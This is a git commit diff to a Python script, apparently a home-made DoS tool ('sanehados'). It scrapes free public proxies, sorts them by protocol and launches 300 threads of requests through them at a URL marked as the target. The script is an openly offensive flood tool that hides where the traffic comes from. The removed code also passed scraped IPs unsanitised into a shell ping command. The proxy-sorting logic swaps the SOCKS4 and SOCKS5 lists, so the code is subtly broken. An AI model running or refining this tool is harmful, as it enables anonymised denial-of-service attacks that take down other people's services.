af3137a4968ec1bc52f1fd615252abf0dd6057e9
mrmudhalai <mrmu@kali.lol>
2020-12-24 19:41:32 +0530

    removed ping

--- sanehados.py
+++ sanehados.py
@@ -7,48 +7,72 @@ import threading
 import os
 
 url = 'http://www.icanhazip.com' #TARGET
+httpproxies = []
+socks4proxies = []
+socks5proxies = []
 def get_proxies():
 	proxies = []
 	res = requests.get('https://free-proxy-list.net').text
 	p = re.findall('(\d+\.\d+\.\d+\.\d+):(\d+)',res)
 	for proxy in p:
-		response = os.system("ping -c 1 " + proxy[0])
-		if response == 0:
-                        print (proxy[0], 'is up!')
-                        proxies.append(proxy[0]+':'+proxy[1])
+		proxies.append(proxy[0]+':'+proxy[1])
 	return proxies
 
-def attack(proxies):
+def check_proxies(proxies):
 	s= requests.Session()
-	proxy = random.choice(proxies)
 	for proxy in proxies:
-		for i in range(100):
+		try:
+			s.proxies = {"http":proxy,"https":proxy}
+			res = s.get(url,timeout = 6)
+			if res :
+				httpproxies.append(proxy)
+		except Exception as e:
 			try:
-				s.proxies = {"http":proxy,"https":proxy}
-				res = s.get(url,timeout = 6)
-				print(res.text)
+				s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
+				res = s.get(url,timeout = 1.5)
+				if res:
+					socks4proxies.append(proxy)
 			except Exception as e:
 				try:
-					s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
-					res = s.get(url,timeout = 1.5)
-					print(res.text)
+					s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
+					res = s.get(url,timeout =1.5)
+					if res:
+						socks5proxies.append(proxy)
 				except Exception as e:
-					try:
-						s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
-						res = s.get(url,timeout =1.5)
-						print(res.text)
-					except Exception as e:
-						print("failed")
-						return 0
+					print("failed")
+					return 0
+	print(httpproxies)
+
+
+def attack():
+	s= requests.Session()
+	if httpproxies:
+		hproxy = random.choice(httpproxies)
+		for i in range(2):
+			s.proxies = {"http":hproxy,"https":hproxy}
+			res = s.get(url,timeout = 6)
+			print(res.text)
+	if socks4proxies:
+		s4proxy = random.choice(socks4proxies)
+		for j in range(2):
+			s.proxies = {"http":"socks4://"+s4proxy,"https":"socks4://"+s4proxy}
+			res = s.get(url,timeout =1.5)
+			print(res.text)
+	if socks5proxies:
+		s5proxy = random.choice(socks5proxies)
+		for k in range(2):
+			s.proxies = {"http":"socks5://"+s5proxy,"https":"socks5://"+s5proxy}
+			res = s.get(url,timeout = 1.5)
+			print(res.text)
 
 if __name__ == "__main__":
 	print("START!")
-	print("It takes a while to get started please be patient you can force quit by long pressing ctrl+c ")
 	proxies = get_proxies()
 	print("Up proxies:")
 	print(proxies)
 	print("Party starts in 321..............")
+	check_proxies(proxies)
 	for i in range(300):
-		t = threading.Thread(target=attack, args=(proxies,))
+		t = threading.Thread(target=attack)
 		t.start()
 
